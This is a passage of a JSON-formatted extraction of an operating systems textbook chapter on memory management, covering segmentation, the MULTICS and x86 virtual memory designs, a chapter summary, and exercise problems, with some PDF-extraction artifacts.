            "content": "3.7.1 Implementation of Pure Segmentation\r\nThe implementation of segmentation differs from paging in an essential way:\r\npages are of fixed size and segments are not. Figure 3-33(a) shows an example of\r\nphysical memory initially containing fiv e segments. Now consider what happens if\r\nsegment 1 is evicted and segment 7, which is smaller, is put in its place. We arrive\r\nat the memory configuration of Fig. 3-33(b). Between segment 7 and segment 2 is\r\nan unused area—that is, a hole. Then segment 4 is replaced by segment 5, as in\r\nFig. 3-33(c), and segment 3 is replaced by segment 6, as in Fig. 3-33(d). After the\r\nsystem has been running for a while, memory will be divided up into a number of\r\nchunks, some containing segments and some containing holes. This phenomenon,\r\ncalled checkerboarding or external fragmentation, wastes memory in the holes.\r\nIt can be dealt with by compaction, as shown in Fig. 3-33(e)."
          },
          "3.7.2 Segmentation with Paging: MULTICS": {
            "page": 274,
            "content": "3.7.2 Segmentation with Paging: MULTICS\r\nIf the segments are large, it may be inconvenient, or even impossible, to keep\r\nthem in main memory in their entirety. This leads to the idea of paging them, so\r\nthat only those pages of a segment that are actually needed have to be around.\n244 MEMORY MANAGEMENT CHAP. 3\r\nConsideration Paging Segmentation\r\nNeed the programmer be aware\r\nthat this technique is being used?\r\nHow many linear address\r\nspaces are there?\r\nCan the total address space\r\nexceed the size of physical\r\nmemory?\r\nCan procedures and data be\r\ndistinguished and separately\r\nprotected?\r\nCan tables whose size fluctuates\r\nbe accommodated easily?\r\nIs sharing of procedures\r\nbetween users facilitated?\r\nWhy was this technique\r\ninvented?\r\nNo\r\nNo\r\nNo\r\nNo\r\n1\r\nYes\r\nYes\r\nYes\r\nYes\r\nYes\r\nYes\r\nMany\r\nTo get a large \r\nlinear address \r\nspace without \r\nhaving to buy \r\nmore physical \r\nmemory\r\nTo allow programs \r\nand data to be broken \r\nup into logically \r\nindependent address \r\nspaces and to aid \r\nsharing and \r\nprotection\r\nFigure 3-32. Comparison of paging and segmentation.\r\nSeveral significant systems have supported paged segments. In this section we will\r\ndescribe the first one: MULTICS. In the next one we will discuss a more recent\r\none: the Intel x86 up until the x86-64.\r\nThe MULTICS operating system was one of the most influential operating sys\u0002tems ever, having had a major influence on topics as disparate as UNIX, the x86\r\nmemory architecture, TLBs, and cloud computing. It was started as a research\r\nproject at M.I.T. and went live in 1969. The last MULTICS system was shut down\r\nin 2000, a run of 31 years. Few other operating systems have lasted more-or-less\r\nunmodified anywhere near that long. While operating systems called Windows\r\nhave also have be around that long, Windows 8 has absolutely nothing in common\r\nwith Windows 1.0 except the name and the fact that it was written by Microsoft.\r\nEven more to the point, the ideas developed in MULTICS are as valid and useful\r\nnow as they were in 1965, when the first paper was published (Corbato´ and Vys\u0002sotsky, 1965). For this reason, we will now spend a little bit of time looking at the\r\nmost innovative aspect of MULTICS, the virtual memory architecture. More infor\u0002mation about MULTICS can be found at www.multicians.org.\r\nMULTICS ran on the Honeywell 6000 machines and their descendants and\r\nprovided each program with a virtual memory of up to 218 segments, each of which\nSEC. 3.7 SEGMENTATION 245\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n(a) (d) (e) (b) (c)\r\nSegment 0\r\n(4K)\r\nSegment 7\r\n(5K)\r\nSegment 2\r\n(5K)\r\nSegment 5\r\n(4K)\r\n(3K)\r\nSegment 3\r\n(8K) Segment 6\r\n(4K)\r\n(3K)\r\nSegment 0\r\n(4K)\r\nSegment 7\r\n(5K)\r\nSegment 2\r\n(5K)\r\nSegment 3\r\n(8K)\r\n(3K)\r\nSegment 2\r\n(5K)\r\nSegment 0\r\n(4K)\r\nSegment 1\r\n(8K)\r\nSegment 4\r\n(7K)\r\nSegment 4\r\n(7K)\r\nSegment 3\r\n(8K)\r\nSegment 0\r\n(4K)\r\nSegment 7\r\n(5K)\r\nSegment 2\r\n(5K)\r\n(3K)\r\nSegment 5\r\n(4K)\r\n(3K)\r\n(4K)\r\nSegment 0\r\n(4K)\r\nSegment 7\r\n(5K)\r\nSegment 2\r\n(5K)\r\nSegment 6\r\n(4K)\r\nSegment 5\r\n(4K)\r\n(10K)\r\nFigure 3-33. (a)-(d) Development of checkerboarding. (e) Removal of the\r\ncheckerboarding by compaction.\r\nwas up to 65,536 (36-bit) words long. To implement this, the MULTICS designers\r\nchose to treat each segment as a virtual memory and to page it, combining the ad\u0002vantages of paging (uniform page size and not having to keep the whole segment in\r\nmemory if only part of it was being used) with the advantages of segmentation\r\n(ease of programming, modularity, protection, sharing).\r\nEach MULTICS program had a segment table, with one descriptor per seg\u0002ment. Since there were potentially more than a quarter of a million entries in the\r\ntable, the segment table was itself a segment and was paged. A segment descriptor\r\ncontained an indication of whether the segment was in main memory or not. If any\r\npart of the segment was in memory, the segment was considered to be in memory,\r\nand its page table was in memory. If the segment was in memory, its descriptor\r\ncontained an 18-bit pointer to its page table, as in Fig. 3-34(a). Because physical\r\naddresses were 24 bits and pages were aligned on 64-byte boundaries (implying\r\nthat the low-order 6 bits of page addresses were 000000), only 18 bits were needed\r\nin the descriptor to store a page table address. The descriptor also contained the\r\nsegment size, the protection bits, and other items. Figure 3-34(b) illustrates a seg\u0002ment descriptor. The address of the segment in secondary memory was not in the\r\nsegment descriptor but in another table used by the segment fault handler.\r\nEach segment was an ordinary virtual address space and was paged in the same\r\nway as the nonsegmented paged memory described earlier in this chapter. The nor\u0002mal page size was 1024 words (although a few small segments used by MULTICS\r\nitself were not paged or were paged in units of 64 words to save physical memory).\r\nAn address in MULTICS consisted of two parts: the segment and the address\r\nwithin the segment. The address within the segment was further divided into a page\n246 MEMORY MANAGEMENT CHAP. 3\r\n(a)\r\n(b)\r\nMain memory address\r\nof the page table\r\nSegment length\r\n(in pages)\r\n18 9 1 1 1 3 3\r\nPage size:\r\n0 = 1024 words\r\n1 = 64 words\r\n0 = segment is paged\r\n1 = segment is not paged\r\nMiscellaneous bits\r\nProtection bits\r\nSegment 6 descriptor\r\nSegment 5 descriptor\r\nSegment 4 descriptor\r\nSegment 3 descriptor\r\nSegment 2 descriptor\r\nSegment 1 descriptor\r\nSegment 0 descriptor\r\nDescriptor segment\r\n36 bits\r\nPage 2 entry\r\nPage 1 entry\r\nPage 0 entry\r\nPage table for segment 1\r\nPage 2 entry\r\nPage 1 entry\r\nPage 0 entry\r\nPage table for segment 3\r\nFigure 3-34. The MULTICS virtual memory. (a) The descriptor segment point\u0002ed to the page tables. (b) A segment descriptor. The numbers are the field\r\nlengths.\r\nnumber and a word within the page, as shown in Fig. 3-35. When a memory refer\u0002ence occurred, the following algorithm was carried out.\r\n1. The segment number was used to find the segment descriptor.\r\n2. A check was made to see if the segment’s page table was in memory.\r\nIf it was, it was located. If it was not, a segment fault occurred. If\r\nthere was a protection violation, a fault (trap) occurred.\nSEC. 3.7 SEGMENTATION 247\r\n3. The page table entry for the requested virtual page was examined. If\r\nthe page itself was not in memory, a page fault was triggered. If it\r\nwas in memory, the main-memory address of the start of the page was\r\nextracted from the page table entry.\r\n4. The offset was added to the page origin to give the main memory ad\u0002dress where the word was located.\r\n5. The read or store finally took place.\r\nSegment number Page\r\nnumber\r\nOffset within\r\nthe page\r\n18 6 10\r\nAddress within\r\nthe segment\r\nFigure 3-35. A 34-bit MULTICS virtual address.\r\nThis process is illustrated in Fig. 3-36. For simplicity, the fact that the descrip\u0002tor segment was itself paged has been omitted. What really happened was that a\r\nregister (the descriptor base register) was used to locate the descriptor segment’s\r\npage table, which, in turn, pointed to the pages of the descriptor segment. Once the\r\ndescriptor for the needed segment was been found, the addressing proceeded as\r\nshown in Fig. 3-36.\r\nAs you have no doubt guessed by now, if the preceding algorithm were ac\u0002tually carried out by the operating system on every instruction, programs would not\r\nrun very fast. In reality, the MULTICS hardware contained a 16-word high-speed\r\nTLB that could search all its entries in parallel for a given key. This was the first\r\nsystem to have a TLB, something used in all modern architectures. It is illustrated\r\nin Fig. 3-37. When an address was presented to the computer, the addressing hard\u0002ware first checked to see if the virtual address was in the TLB. If so, it got the\r\npage frame number directly from the TLB and formed the actual address of the ref\u0002erenced word without having to look in the descriptor segment or page table.\r\nThe addresses of the 16 most recently referenced pages were kept in the TLB.\r\nPrograms whose working set was smaller than the TLB size came to equilibrium\r\nwith the addresses of the entire working set in the TLB and therefore ran ef\u0002ficiently; otherwise, there were TLB faults."
          },
          "3.7.3 Segmentation with Paging: The Intel x86": {
            "page": 278,
            "content": "3.7.3 Segmentation with Paging: The Intel x86\r\nUp until the x86-64, the virtual memory system of the x86 resembled that of\r\nMULTICS in many ways, including the presence of both segmentation and paging.\r\nWhereas MULTICS had 256K independent segments, each up to 64K 36-bit\r\nwords, the x86 has 16K independent segments, each holding up to 1 billion 32-bit\n248 MEMORY MANAGEMENT CHAP. 3\r\nSegment number Page\r\nnumber Offset\r\nDescriptor\r\nsegment\r\nSegment\r\nnumber\r\nPage\r\nnumber\r\nMULTICS virtual address\r\nPage\r\ntable\r\nPage\r\nWord\r\nOffset\r\nDescriptor Page frame\r\nFigure 3-36. Conversion of a two-part MULTICS address into a main memory address.\r\nSegment\r\nnumber\r\nVirtual\r\npage\r\nPage\r\nframe\r\nComparison\r\nfield\r\nProtection Age\r\nIs this\r\nentry\r\nused?\r\n4\r\n6\r\n12\r\n2\r\n2\r\n1\r\n0\r\n3\r\n1\r\n2\r\n7\r\n2\r\n1\r\n0\r\n12\r\nRead/write\r\nRead only\r\nRead/write\r\nExecute only\r\nExecute only\r\n13\r\n10\r\n2\r\n7\r\n9\r\n1\r\n1\r\n1\r\n0\r\n1\r\n1\r\nFigure 3-37. A simplified version of the MULTICS TLB. The existence of two\r\npage sizes made the actual TLB more complicated.\r\nwords. Although there are fewer segments, the larger segment size is far more im\u0002portant, as few programs need more than 1000 segments, but many programs need\r\nlarge segments. As of x86-64, segmentation is considered obsolete and is no longer\r\nsupported, except in legacy mode. Although some vestiges of the old segmentation\nSEC. 3.7 SEGMENTATION 249\r\nmechanisms are still available in x86-64’s native mode, mostly for compatibility,\r\nthey no longer serve the same role and no longer offer true segmentation. The\r\nx86-32, however, still comes equipped with the whole shebang and it is the CPU\r\nwe will discuss in this section.\r\nThe heart of the x86 virtual memory consists of two tables, called the LDT\r\n(Local Descriptor Table) and the GDT (Global Descriptor Table). Each pro\u0002gram has its own LDT, but there is a single GDT, shared by all the programs on the\r\ncomputer. The LDT describes segments local to each program, including its code,\r\ndata, stack, and so on, whereas the GDT describes system segments, including the\r\noperating system itself.\r\nTo access a segment, an x86 program first loads a selector for that segment into\r\none of the machine’s six segment registers. During execution, the CS register holds\r\nthe selector for the code segment and the DS register holds the selector for the data\r\nsegment. The other segment registers are less important. Each selector is a 16-bit\r\nnumber, as shown in Fig. 3-38.\r\nIndex\r\n0 = GDT/1 = LDT Privilege level (0-3)\r\nBits 13 1 2\r\nFigure 3-38. An x86 selector.\r\nOne of the selector bits tells whether the segment is local or global (i.e., wheth\u0002er it is in the LDT or GDT). Thirteen other bits specify the LDT or GDT entry\r\nnumber, so these tables are each restricted to holding 8K segment descriptors. The\r\nother 2 bits relate to protection, and will be described later. Descriptor 0 is forbid\u0002den. It may be safely loaded into a segment register to indicate that the segment\r\nregister is not currently available. It causes a trap if used.\r\nAt the time a selector is loaded into a segment register, the corresponding de\u0002scriptor is fetched from the LDT or GDT and stored in microprogram registers, so\r\nit can be accessed quickly. As depicted in Fig. 3-39, a descriptor consists of 8\r\nbytes, including the segment’s base address, size, and other information.\r\nThe format of the selector has been cleverly chosen to make locating the de\u0002scriptor easy. First either the LDT or GDT is selected, based on selector bit 2.\r\nThen the selector is copied to an internal scratch register, and the 3 low-order bits\r\nset to 0. Finally, the address of either the LDT or GDT table is added to it, to give\r\na direct pointer to the descriptor. For example, selector 72 refers to entry 9 in the\r\nGDT, which is located at address GDT + 72.\r\nLet us now trace the steps by which a (selector, offset) pair is converted to a\r\nphysical address. As soon as the microprogram knows which segment register is\n250 MEMORY MANAGEMENT CHAP. 3\r\nPrivilege level (0-3)\r\nRelative\r\naddress\r\n0\r\n4\r\nBase 0-15 Limit 0-15\r\nBase 24-31 Base 16-23 Limit\r\n16-19 G D 0 P DPL Type\r\n0: Li is in bytes\r\n1: Li is in pages\r\n0: 16-Bit segment\r\n1: 32-Bit segment\r\n0: Segment is absent from memory\r\n1: Segment is present in memory\r\nSegment type and protection\r\nS\r\n\r\n\r\n0: System\r\n1: Application\r\n32 Bits\r\nFigure 3-39. x86 code segment descriptor. Data segments differ slightly.\r\nbeing used, it can find the complete descriptor corresponding to that selector in its\r\ninternal registers. If the segment does not exist (selector 0), or is currently paged\r\nout, a trap occurs.\r\nThe hardware then uses the Limit field to check if the offset is beyond the end\r\nof the segment, in which case a trap also occurs. Logically, there should be a 32-bit\r\nfield in the descriptor giving the size of the segment, but only 20 bits are available,\r\nso a different scheme is used. If the Gbit (Granularity) field is 0, the Limit field is\r\nthe exact segment size, up to 1 MB. If it is 1, the Limit field gives the segment size\r\nin pages instead of bytes. With a page size of 4 KB, 20 bits are enough for seg\u0002ments up to 232 bytes.\r\nAssuming that the segment is in memory and the offset is in range, the x86\r\nthen adds the 32-bit Base field in the descriptor to the offset to form what is called\r\na linear address, as shown in Fig. 3-40. The Base field is broken up into three\r\npieces and spread all over the descriptor for compatibility with the 286, in which\r\nthe Base is only 24 bits. In effect, the Base field allows each segment to start at an\r\narbitrary place within the 32-bit linear address space.\r\nDescriptor\r\nBase address\r\nLimit\r\nOther fields\r\n32-Bit linear address\r\n+\r\nSelector Offset\r\nFigure 3-40. Conversion of a (selector, offset) pair to a linear address.\nSEC. 3.7 SEGMENTATION 251\r\nIf paging is disabled (by a bit in a global control register), the linear address is\r\ninterpreted as the physical address and sent to the memory for the read or write.\r\nThus with paging disabled, we have a pure segmentation scheme, with each seg\u0002ment’s base address given in its descriptor. Segments are not prevented from over\u0002lapping, probably because it would be too much trouble and take too much time to\r\nverify that they were all disjoint.\r\nOn the other hand, if paging is enabled, the linear address is interpreted as a\r\nvirtual address and mapped onto the physical address using page tables, pretty\r\nmuch as in our earlier examples. The only real complication is that with a 32-bit\r\nvirtual address and a 4-KB page, a segment might contain 1 million pages, so a\r\ntwo-level mapping is used to reduce the page table size for small segments.\r\nEach running program has a page directory consisting of 1024 32-bit entries.\r\nIt is located at an address pointed to by a global register. Each entry in this direc\u0002tory points to a page table also containing 1024 32-bit entries. The page table en\u0002tries point to page frames. The scheme is shown in Fig. 3-41.\r\n(a)\r\n(b)\r\nBits \r\nLinear address\r\n10 10 12\r\nDir Page Offset\r\nPage directory\r\nDirectory entry\r\npoints to\r\npage table\r\nPage table\r\nentry points\r\nto word\r\nPage frame\r\nWord\r\nselected\r\nDir\r\nPage table\r\nPage\r\n1024\r\nEntries\r\nOffset\r\nFigure 3-41. Mapping of a linear address onto a physical address.\r\nIn Fig. 3-41(a) we see a linear address divided into three fields, Dir, Page, and\r\nOffset. The Dir field is used to index into the page directory to locate a pointer to\r\nthe proper page table. Then the Page field is used as an index into the page table to\r\nfind the physical address of the page frame. Finally, Offset is added to the address\r\nof the page frame to get the physical address of the byte or word needed.\r\nThe page table entries are 32 bits each, 20 of which contain a page frame num\u0002ber. The remaining bits contain access and dirty bits, set by the hardware for the\r\nbenefit of the operating system, protection bits, and other utility bits.\n252 MEMORY MANAGEMENT CHAP. 3\r\nEach page table has entries for 1024 4-KB page frames, so a single page table\r\nhandles 4 megabytes of memory. A segment shorter than 4M will have a page di\u0002rectory with a single entry, a pointer to its one and only page table. In this way, the\r\noverhead for short segments is only two pages, instead of the million pages that\r\nwould be needed in a one-level page table.\r\nTo avoid making repeated references to memory, the x86, like MULTICS, has\r\na small TLB that directly maps the most recently used Dir-Page combinations\r\nonto the physical address of the page frame. Only when the current combination is\r\nnot present in the TLB is the mechanism of Fig. 3-41 actually carried out and the\r\nTLB updated. As long as TLB misses are rare, performance is good.\r\nIt is also worth noting that if some application does not need segmentation but\r\nis simply content with a single, paged, 32-bit address space, that model is possible.\r\nAll the segment registers can be set up with the same selector, whose descriptor\r\nhas Base = 0 and Limit set to the maximum. The instruction offset will then be the\r\nlinear address, with only a single address space used—in effect, normal paging. In\r\nfact, all current operating systems for the x86 work this way. OS/2 was the only\r\none that used the full power of the Intel MMU architecture.\r\nSo why did Intel kill what was a variant of the perfectly good MULTICS mem\u0002ory model that it supported for close to three decades? Probably the main reason is\r\nthat neither UNIX nor Windows ever used it, even though it was quite efficient be\u0002cause it eliminated system calls, turning them into lightning-fast procedure calls to\r\nthe relevant address within a protected operating system segment. None of the\r\ndevelopers of any UNIX or Windows system wanted to change their memory\r\nmodel to something that was x86 specific because it would break portability to\r\nother platforms. Since the software was not using the feature, Intel got tired of\r\nwasting chip area to support it and removed it from the 64-bit CPUs.\r\nAll in all, one has to give credit to the x86 designers. Given the conflicting\r\ngoals of implementing pure paging, pure segmentation, and paged segments, while\r\nat the same time being compatible with the 286, and doing all of this efficiently,\r\nthe resulting design is surprisingly simple and clean."
          }
        }
      },
      "3.8 RESEARCH ON MEMORY MANAGEMENT": {
        "page": 283,
        "content": "3.8 RESEARCH ON MEMORY MANAGEMENT\r\nTraditional memory management, especially paging algorithms for uniproces\u0002sor CPUs, was once a fruitful area for research, but most of that seems to have\r\nlargely died off, at least for general-purpose systems, although there are some peo\u0002ple who never say die (Moruz et al., 2012) or are focused on some application,\r\nsuch as online transaction processing, that has specialized requirements (Stoica and\r\nAilamaki, 2013). Even on uniprocessors, paging to SSDs rather than to hard disks\r\nbrings up new issues and requires new algorithms (Chen et al., 2012). Paging to\r\nthe up-and-coming nonvolatile phase-change memories also requires rethinking\nSEC. 3.8 RESEARCH ON MEMORY MANAGEMENT 253\r\npaging for performance (Lee et al., 2013), and latency reasons (Saito and Oikawa,\r\n2012), and because they wear out if used too much (Bheda et al., 2011, 2012).\r\nMore generally, research on paging is still ongoing, but it focuses on newer\r\nkinds of systems. For example, virtual machines have rekindled interest in mem\u0002ory management (Bugnion et al., 2012). In the same area, the work by Jantz et al.\r\n(2013) lets applications provide guidance to the system with respect to deciding on\r\nthe physical page to back a virtual page. An aspect of server consolidation in the\r\ncloud that affects paging is that the amount of physical memory available to a vir\u0002tual machine can vary over time, requiring new algorithms (Peserico, 2013).\r\nPaging in multicore systems has become a hot new area of research (Boyd\u0002Wickizer et al., 2008, Baumann et al., 2009). One contributing factor is that multi\u0002core systems tend to have a lot of caches shared in complex ways (Lopez-Ortiz and\r\nSalinger, 2012). Closely related to this multicore work is research on paging in\r\nNUMA systems, where different pieces of memory may have different access\r\ntimes (Dashti et al., 2013; and Lankes et al., 2012).\r\nAlso, smartphones and tablets have become small PCs and many of them page\r\nRAM to ‘‘disk,’’ only disk on a smartphone is flash memory. Some recent work is\r\nreported by Joo et al. (2012).\r\nFinally, interest is memory management for real-time systems continues to be\r\npresent (Kato et al., 2011)."
      },
      "3.9 SUMMARY": {
        "page": 284,
        "content": "3.9 SUMMARY\r\nIn this chapter we have examined memory management. We saw that the sim\u0002plest systems do not swap or page at all. Once a program is loaded into memory, it\r\nremains there in place until it finishes. Some operating systems allow only one\r\nprocess at a time in memory, while others support multiprogramming. This model\r\nis still common in small, embedded real-time systems.\r\nThe next step up is swapping. When swapping is used, the system can handle\r\nmore processes than it has room for in memory. Processes for which there is no\r\nroom are swapped out to the disk. Free space in memory and on disk can be kept\r\ntrack of with a bitmap or a hole list.\r\nModern computers often have some form of virtual memory. In the simplest\r\nform, each process’ address space is divided up into uniform-sized blocks called\r\npages, which can be placed into any available page frame in memory. There are\r\nmany page replacement algorithms; two of the better algorithms are aging and\r\nWSClock.\r\nTo make paging systems work well, choosing an algorithm is not enough;\r\nattention to such issues as determining the working set, memory allocation policy,\r\nand page size is required.\r\nSegmentation helps in handling data structures that can change size during ex\u0002ecution and simplifies linking and sharing. It also facilitates providing different\n254 MEMORY MANAGEMENT CHAP. 3\r\nprotection for different segments. Sometimes segmentation and paging are com\u0002bined to provide a two-dimensional virtual memory. The MULTICS system and the\r\n32-bit Intel x86 support segmentation and paging. Still, it is clear that few operat\u0002ing system developers care deeply about segmentation (because they are married to\r\na different memory model). Consequently, it seems to be going out of fashion fast.\r\nToday, even the 64-bit version of the x86 no longer supports real segmentation.\r\nPROBLEMS\r\n1. The IBM 360 had a scheme of locking 2-KB blocks by assigning each one a 4-bit key\r\nand having the CPU compare the key on every memory reference to the 4-bit key in the\r\nPSW. Name two drawbacks of this scheme not mentioned in the text.\r\n2. In Fig. 3-3 the base and limit registers contain the same value, 16,384. Is this just an\r\naccident, or are they always the same? It is just an accident, why are they the same in\r\nthis example?\r\n3. A swapping system eliminates holes by compaction. Assuming a random distribution\r\nof many holes and many data segments and a time to read or write a 32-bit memory\r\nword of 4 nsec, about how long does it take to compact 4 GB? For simplicity, assume\r\nthat word 0 is part of a hole and that the highest word in memory contains valid data.\r\n4. Consider a swapping system in which memory consists of the following hole sizes in\r\nmemory order: 10 MB, 4 MB, 20 MB, 18 MB, 7 MB, 9 MB, 12 MB, and 15 MB.\r\nWhich hole is taken for successive segment requests of\r\n(a) 12 MB\r\n(b) 10 MB\r\n(c) 9 MB\r\nfor first fit? Now repeat the question for best fit, worst fit, and next fit.\r\n5. What is the difference between a physical address and a virtual address?\r\n6. For each of the following decimal virtual addresses, compute the virtual page number\r\nand offset for a 4-KB page and for an 8 KB page: 20000, 32768, 60000.\r\n7. Using the page table of Fig. 3-9, give the physical address corresponding to each of the\r\nfollowing virtual addresses:\r\n(a) 20\r\n(b) 4100\r\n(c) 8300\r\n8. The Intel 8086 processor did not have an MMU or support virtual memory. Nev erthe\u0002less, some companies sold systems that contained an unmodified 8086 CPU and did\r\npaging. Make an educated guess as to how they did it. (Hint: Think about the logical\r\nlocation of the MMU.)\nCHAP. 3 PROBLEMS 255\r\n9. What kind of hardware support is needed for a paged virtual memory to work?\r\n10. Copy on write is an interesting idea used on server systems. Does it make any sense on\r\na smartphone?\r\n11. Consider the following C program:\r\nint X[N];\r\nint step = M; /* M is some predefined constant */\r\nfor (int i = 0; i < N; i += step) X[i] = X[i] + 1;\r\n(a) If this program is run on a machine with a 4-KB page size and 64-entry TLB, what\r\nvalues of M and N will cause a TLB miss for every execution of the inner loop?\r\n(b) Would your answer in part (a) be different if the loop were repeated many times?\r\nExplain.\r\n12. The amount of disk space that must be available for page storage is related to the maxi\u0002mum number of processes, n, the number of bytes in the virtual address space, v, and\r\nthe number of bytes of RAM, r. Giv e an expression for the worst-case disk-space re\u0002quirements. How realistic is this amount?\r\n13. If an instruction takes 1 nsec and a page fault takes an additional n nsec, give a formula\r\nfor the effective instruction time if page faults occur every k instructions.\r\n14. A machine has a 32-bit address space and an 8-KB page. The page table is entirely in\r\nhardware, with one 32-bit word per entry. When a process starts, the page table is cop\u0002ied to the hardware from memory, at one word every 100 nsec. If each process runs for\r\n100 msec (including the time to load the page table), what fraction of the CPU time is\r\ndevoted to loading the page tables?\r\n15. Suppose that a machine has 48-bit virtual addresses and 32-bit physical addresses.\r\n(a) If pages are 4 KB, how many entries are in the page table if it has only a single\r\nlevel? Explain.\r\n(b) Suppose this same system has a TLB (Translation Lookaside Buffer) with 32 en\u0002tries. Furthermore, suppose that a program contains instructions that fit into one\r\npage and it sequentially reads long integer elements from an array that spans thou\u0002sands of pages. How effective will the TLB be for this case?\r\n16. You are given the following data about a virtual memory system:\r\n(a)The TLB can hold 1024 entries and can be accessed in 1 clock cycle (1 nsec).\r\n(b) A page table entry can be found in 100 clock cycles or 100 nsec.\r\n(c) The average page replacement time is 6 msec.\r\nIf page references are handled by the TLB 99% of the time, and only 0.01% lead to a\r\npage fault, what is the effective address-translation time?\r\n17. Suppose that a machine has 38-bit virtual addresses and 32-bit physical addresses.\r\n(a) What is the main advantage of a multilevel page table over a single-level one?\r\n(b) With a two-level page table, 16-KB pages, and 4-byte entries, how many bits\r\nshould be allocated for the top-level page table field and how many for the next\u0002level page table field? Explain.\n256 MEMORY MANAGEMENT CHAP. 3\r\n18. Section 3.3.4 states that the Pentium Pro extended each entry in the page table hier\u0002archy to 64 bits but still could only address only 4 GB of memory. Explain how this\r\nstatement can be true when page table entries have 64 bits.\r\n19. A computer with a 32-bit address uses a two-level page table. Virtual addresses are\r\nsplit into a 9-bit top-level page table field, an 11-bit second-level page table field, and\r\nan offset. How large are the pages and how many are there in the address space?\r\n20. A computer has 32-bit virtual addresses and 4-KB pages. The program and data toget\u0002her fit in the lowest page (0–4095) The stack fits in the highest page. How many en\u0002tries are needed in the page table if traditional (one-level) paging is used? How many\r\npage table entries are needed for two-level paging, with 10 bits in each part?\r\n21. Below is an execution trace of a program fragment for a computer with 512-byte\r\npages. The program is located at address 1020, and its stack pointer is at 8192 (the\r\nstack grows toward 0). Give the page reference string generated by this program. Each\r\ninstruction occupies 4 bytes (1 word) including immediate constants. Both instruction\r\nand data references count in the reference string.\r\nLoad word 6144 into register 0\r\nPush register 0 onto the stack\r\nCall a procedure at 5120, stacking the return address\r\nSubtract the immediate constant 16 from the stack pointer\r\nCompare the actual parameter to the immediate constant 4\r\nJump if equal to 5152\r\n22. A computer whose processes have 1024 pages in their address spaces keeps its page\r\ntables in memory. The overhead required for reading a word from the page table is 5\r\nnsec. To reduce this overhead, the computer has a TLB, which holds 32 (virtual page,\r\nphysical page frame) pairs, and can do a lookup in 1 nsec. What hit rate is needed to\r\nreduce the mean overhead to 2 nsec?\r\n23. How can the associative memory device needed for a TLB be implemented in hard\u0002ware, and what are the implications of such a design for expandability?\r\n24. A machine has 48-bit virtual addresses and 32-bit physical addresses. Pages are 8 KB.\r\nHow many entries are needed for a single-level linear page table?\r\n25. A computer with an 8-KB page, a 256-KB main memory, and a 64-GB virtual address\r\nspace uses an inverted page table to implement its virtual memory. How big should the\r\nhash table be to ensure a mean hash chain length of less than 1? Assume that the hash\u0002table size is a power of two.\r\n26. A student in a compiler design course proposes to the professor a project of writing a\r\ncompiler that will produce a list of page references that can be used to implement the\r\noptimal page replacement algorithm. Is this possible? Why or why not? Is there any\u0002thing that could be done to improve paging efficiency at run time?\r\n27. Suppose that the virtual page reference stream contains repetitions of long sequences\r\nof page references followed occasionally by a random page reference. For example, the\r\nsequence: 0, 1, ... , 511, 431, 0, 1, ... , 511, 332, 0, 1, ... consists of repetitions of the\r\nsequence 0, 1, ... , 511 followed by a random reference to pages 431 and 332.\nCHAP. 3 PROBLEMS 257\r\n(a) Why will the standard replacement algorithms (LRU, FIFO, clock) not be effective\r\nin handling this workload for a page allocation that is less than the sequence\r\nlength?\r\n(b) If this program were allocated 500 page frames, describe a page replacement ap\u0002proach that would perform much better than the LRU, FIFO, or clock algorithms.\r\n28. If FIFO page replacement is used with four page frames and eight pages, how many\r\npage faults will occur with the reference string 0172327103 if the four frames are ini\u0002tially empty? Now repeat this problem for LRU.\r\n29. Consider the page sequence of Fig. 3-15(b). Suppose that the R bits for the pages B\r\nthrough A are 11011011, respectively. Which page will second chance remove?\r\n30. A small computer on a smart card has four page frames. At the first clock tick, the R\r\nbits are 0111 (page 0 is 0, the rest are 1). At subsequent clock ticks, the values are\r\n1011, 1010, 1101, 0010, 1010, 1100, and 0001. If the aging algorithm is used with an\r\n8-bit counter, giv e the values of the four counters after the last tick.\r\n31. Give a simple example of a page reference sequence where the first page selected for\r\nreplacement will be different for the clock and LRU page replacement algorithms. As\u0002sume that a process is allocated 3=three frames, and the reference string contains page\r\nnumbers from the set 0, 1, 2, 3.\r\n32. In the WSClock algorithm of Fig. 3-20(c), the hand points to a page with R = 0. If\r\nτ = 400, will this page be removed? What about if τ = 1000?\r\n33. Suppose that the WSClock page replacement algorithm uses a τ of two ticks, and the\r\nsystem state is the following:\r\nPa ge Time stamp V R M\r\n0 6 101\r\n1 9 110\r\n2 9 111\r\n3 7 100\r\n4 4 000\r\nwhere the three flag bits V, R, and M stand for Valid, Referenced, and Modified, re\u0002spectively.\r\n(a) If a clock interrupt occurs at tick 10, show the contents of the new table entries. Ex\u0002plain. (You can omit entries that are unchanged.)\r\n(b) Suppose that instead of a clock interrupt, a page fault occurs at tick 10 due to a read\r\nrequest to page 4. Show the contents of the new table entries. Explain. (You can\r\nomit entries that are unchanged.)\r\n34. A student has claimed that ‘‘in the abstract, the basic page replacement algorithms\r\n(FIFO, LRU, optimal) are identical except for the attribute used for selecting the page\r\nto be replaced.’’\r\n(a) What is that attribute for the FIFO algorithm? LRU algorithm? Optimal algorithm?\r\n(b) Give the generic algorithm for these page replacement algorithms.\n258 MEMORY MANAGEMENT CHAP. 3\r\n35. How long does it take to load a 64-KB program from a disk whose average seek time is\r\n5 msec, whose rotation time is 5 msec, and whose tracks hold 1 MB\r\n(a) for a 2-KB page size?\r\n(b) for a 4-KB page size?\r\nThe pages are spread randomly around the disk and the number of cylinders is so large\r\nthat the chance of two pages being on the same cylinder is negligible.\r\n36. A computer has four page frames. The time of loading, time of last access, and the R\r\nand M bits for each page are as shown below (the times are in clock ticks):\r\nPa ge Loaded Last ref. R M\r\n0 126 280 1 0\r\n1 230 265 0 1\r\n2 140 270 0 0\r\n3 110 285 1 1\r\n(a) Which page will NRU replace?\r\n(b) Which page will FIFO replace?\r\n(c) Which page will LRU replace?\r\n(d) Which page will second chance replace?\r\n37. Suppose that two processes A and B share a page that is not in memory. If process A\r\nfaults on the shared page, the page table entry for process A must be updated once the\r\npage is read into memory.\r\n(a) Under what conditions should the page table update for process B be delayed even\r\nthough the handling of process A’s page fault will bring the shared page into mem\u0002ory? Explain.\r\n(b) What is the potential cost of delaying the page table update?\r\n38. Consider the following two-dimensional array:\r\nint X[64][64];\r\nSuppose that a system has four page frames and each frame is 128 words (an integer\r\noccupies one word). Programs that manipulate the X array fit into exactly one page\r\nand always occupy page 0. The data are swapped in and out of the other three frames.\r\nThe X array is stored in row-major order (i.e., X[0][1] follows X[0][0] in memory).\r\nWhich of the two code fragments shown below will generate the lowest number of\r\npage faults? Explain and compute the total number of page 